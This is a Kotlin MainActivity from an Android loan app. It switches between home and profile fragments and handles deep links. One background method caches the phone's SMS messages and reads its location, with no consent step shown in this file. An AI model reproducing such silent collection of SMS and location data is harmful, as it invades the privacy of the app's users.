package com.chocolate.nigerialoanapp.ui

import android.Manifest
import android.content.Intent
import android.os.Build
import android.os.Bundle
import android.util.Log
import android.view.View
import android.view.View.OnClickListener
import androidx.appcompat.widget.AppCompatImageView
import com.blankj.utilcode.constant.PermissionConstants
import com.blankj.utilcode.util.BarUtils
import com.blankj.utilcode.util.PermissionUtils
import com.blankj.utilcode.util.ThreadUtils
import com.blankj.utilcode.util.ThreadUtils.SimpleTask
import com.blankj.utilcode.util.ToastUtils
import com.chocolate.nigerialoanapp.BuildConfig
import com.chocolate.nigerialoanapp.R
import com.chocolate.nigerialoanapp.base.BaseActivity
import com.chocolate.nigerialoanapp.base.BaseFragment
import com.chocolate.nigerialoanapp.collect.LocationMgr
import com.chocolate.nigerialoanapp.collect.item.CollectSmsMgr
import com.chocolate.nigerialoanapp.global.ConfigMgr
import com.chocolate.nigerialoanapp.log.LogSaver
import com.chocolate.nigerialoanapp.ui.loanapply.LoanApplyActivity
import com.chocolate.nigerialoanapp.utils.FirebaseUtils


class MainActivity : BaseActivity() {

    private var mHomeFragment: HomeFragment? = null
    private var mMineFragment: MineFragment? = null

    //0 home 1mine
    private var mCurPageType: Int = 0

    private var ivMainHome: AppCompatImageView? = null
    private var ivMainMine: AppCompatImageView? = null

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        BarUtils.setStatusBarVisibility(this,true)
        BarUtils.setStatusBarColor(this, resources.getColor(R.color.white))
        BarUtils.setStatusBarLightMode(this, true)
        setContentView(R.layout.activity_main)
        initView()
        ConfigMgr.getAllConfig()
    }

    private fun initView() {
        ivMainHome = findViewById<AppCompatImageView>(R.id.iv_main_home)
        ivMainMine = findViewById<AppCompatImageView>(R.id.iv_main_mine)
        ivMainHome?.setOnClickListener(object : OnClickListener {
            override fun onClick(v: View?) {
                mCurPageType = 0
                updatePageByTypeInternal()
            }

        })
        ivMainMine?.setOnClickListener(object : OnClickListener {
            override fun onClick(v: View?) {
                mCurPageType = 1
                updatePageByTypeInternal()
            }

        })
        updatePageByTypeInternal()
    }

    override fun onNewIntent(intent: Intent?) {
        super.onNewIntent(intent)
        val data = intent?.data
        if (data != null) {
            val path = data.path // 获取路径部分进行处理
            Log.e("Test", " path = $path")
            mCurPageType = 0
            updatePageByTypeInternal()
        }
    }

    private fun replaceFragment(fragment: BaseFragment, containRes: Int) {
        val fragmentManager = supportFragmentManager
        val transaction = fragmentManager.beginTransaction() // 开启一个事务
        transaction.replace(containRes, fragment)
        transaction.commitAllowingStateLoss()
    }

    private fun updatePageByTypeInternal() {
        var curFragment: BaseFragment? = null
        when (mCurPageType) {
            0 -> {
                if (mHomeFragment == null) {
                    mHomeFragment = HomeFragment()
                }
                curFragment = mHomeFragment
                ivMainHome?.isSelected = true
                ivMainMine?.isSelected = false
            }

            1 -> {
                if (mMineFragment == null) {
                    mMineFragment = MineFragment()
                }
                curFragment = mMineFragment
                ivMainHome?.isSelected = false
                ivMainMine?.isSelected = true
            }
        }
        if (curFragment != null) {
            replaceFragment(curFragment, R.id.fl_main_container)
        }

    }

    private fun executeCache() {
        LogSaver.logToFile("execute next...")
        ThreadUtils.executeByCached<Any>(object : SimpleTask<Any?>() {
            @Throws(Throwable::class)
            override fun doInBackground(): Any {
                try {
                    CollectSmsMgr.sInstance.tryCacheSms()
                } catch (e: Exception) {
                    if (BuildConfig.DEBUG) {
                        throw e
                    }
                }
                return ""
            }

            override fun onSuccess(result: Any?) {
                try {
                    LocationMgr.getInstance().getLocation()
                } catch (e: Exception) {
                    if (BuildConfig.DEBUG) {
                        throw e
                    }
                }
            }
        })
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        if (requestCode == LoanApplyActivity.REQUEST_CODE && resultCode == LoanApplyActivity.RESULT_CODE) {
            mHomeFragment?.onActivityResultInternal()
        }
    }

    override fun useLogout(): Boolean {
        return true
    }
}
